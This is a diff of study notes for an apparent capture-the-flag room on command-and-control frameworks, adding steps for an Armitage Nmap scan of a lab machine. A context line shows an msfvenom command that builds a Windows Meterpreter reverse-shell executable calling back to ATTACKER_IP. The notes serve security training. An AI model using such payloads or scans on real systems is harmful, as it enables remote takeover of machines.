@@ -4,7 +4,7 @@
 - [x] [Task 2  Command and Control Framework Structure](#task-2--command-and-control-framework-structure)
 - [x] [Task 3  Common C2 Frameworks](#task-3--common-c2-frameworks) [`C2Matrix`](https://docs.google.com/spreadsheets/d/19IjBcl_zuRm-N5D2b9f3Gtk7eh3yCdYC_yGnIHkec7k/edit?usp=sharing)
 - [x] [Task 4  Setting Up a C2 Framework](#task-4--setting-up-a-c2-framework)
-- [ ] [Task 5  C2 Operation Basics](#task-5--c2-operation-basics)
+- [x] [Task 5  C2 Operation Basics](#task-5--c2-operation-basics)
 - [ ] [Task 6  Command, Control, and Conquer](#task-6--command-control-and-conquer)
 - [ ] [Task 7  Advanced C2 Setups](#task-7--advanced-c2-setups)
 - [x] [Task 8  Wrapping Up](#task-8--wrapping-up)
@@ -398,6 +398,21 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe
 ---
 
 # [Task 6  Command, Control, and Conquer]()
+
+### Sample Exploit
+#### Host Enumeration with Armitage
+- Before letting you go off on your own, we're going to demonstrate how to exploit a sample Virtual Machine. 
+- First, we will execute a port scan within Armitage by going to the "Hosts" section, hovering over "Nmap Scan", and selecting "Quick Scan".
+  > ![image](https://user-images.githubusercontent.com/51442719/180647296-111e71b0-d80e-4599-b601-2a88b52fe818.png)
+  > - *Armitage submenu of Hosts -> Nmap Scan -> Quick Scan*
+- After selecting "Quick scan", a new option will pop up; this will prompt you to enter the IP Address range you would like to scan. You should enter the IP Address of the deployed Virtual machine in this box. 
+  > ![image](https://user-images.githubusercontent.com/51442719/180647325-ac44411e-25d0-4bba-8ec5-70e624a6001f.png)
+  > - *Input menu of "Enter Scan Range" with the IP Address VICTIM_MACHINE*
+- After pressing "Ok", and waiting a moment or two, you should see a new tab open up called "nmap" and a new machine display in the "Workspace" window. 
+- In the "nmap" tab, you will see the raw scan results.
+  > ![image](https://user-images.githubusercontent.com/51442719/180647356-654debfc-17eb-45b3-a4a4-08c733b8f7b5.png)
+  > - *Results from the Nmap port-scan*
+ 
 
 ---
 
